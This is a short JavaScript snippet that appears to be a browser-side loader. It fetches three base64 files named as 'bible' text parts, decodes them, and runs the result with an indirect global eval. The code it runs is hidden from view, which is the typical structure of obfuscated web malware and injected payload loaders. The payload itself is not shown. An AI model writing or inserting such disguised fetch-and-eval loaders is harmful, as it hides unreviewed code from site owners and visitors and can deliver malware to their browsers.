(async function(){
  const parts=[];
  for(let i=0;i<3;i++){
    const r=await fetch('/js/bible_part_'+i+'.b64');
    parts.push(await r.text());
  }
  const bin=Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0));
  const code=new TextDecoder().decode(bin);
  (0,eval)(code);
})();
